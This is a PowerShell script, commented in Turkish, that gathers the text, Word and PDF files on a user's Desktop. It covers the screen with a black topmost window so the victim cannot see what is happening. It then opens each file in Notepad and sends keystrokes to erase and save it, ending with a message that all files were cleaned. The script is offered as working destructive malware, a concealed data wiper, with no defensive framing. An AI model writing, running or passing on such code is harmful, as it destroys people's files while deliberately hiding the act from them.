# Masaüstü yolu
$desktop = [Environment]::GetFolderPath("Desktop")

# Dosya uzantıları
$exts = @("*.txt", "*.docx", "*.pdf")

# Tüm hedef dosyalar
$targets = @()
foreach ($ext in $exts) {
    $targets += Get-ChildItem -Path $desktop -Recurse -Include $ext -ErrorAction SilentlyContinue
}

# Ekranı siyah fullscreen pencere ile kapat
$blackScreen = {
    Add-Type -AssemblyName PresentationFramework
    $window = New-Object System.Windows.Window
    $window.WindowStyle = "None"
    $window.WindowState = "Maximized"
    $window.Background = "Black"
    $window.Topmost = $true
    $window.ShowDialog() | Out-Null
}

Start-Job -ScriptBlock $blackScreen | Out-Null

# Dosyaları tek tek aç, içini sil, kaydet ve kapat
foreach ($file in $targets) {
    try {
        # Notepad'i aç dosyayla
        $proc = Start-Process notepad.exe -ArgumentList $file.FullName -PassThru
        Start-Sleep -Seconds 1.5

        # Notepad penceresine odaklan ve Ctrl+A, Delete, Ctrl+S, Alt+F4 gönder
        $wshell = New-Object -ComObject wscript.shell
        $wshell.AppActivate($proc.Id)
        Start-Sleep -Milliseconds 500
        $wshell.SendKeys("^(a)")
        Start-Sleep -Milliseconds 200
        $wshell.SendKeys("{BACKSPACE}")
        Start-Sleep -Milliseconds 200
        $wshell.SendKeys("^(s)")
        Start-Sleep -Milliseconds 200
        $wshell.SendKeys("%{F4}")
        Start-Sleep -Milliseconds 500
    } catch {
        continue
    }
}

Write-Host "Tüm dosyalar temizlendi."
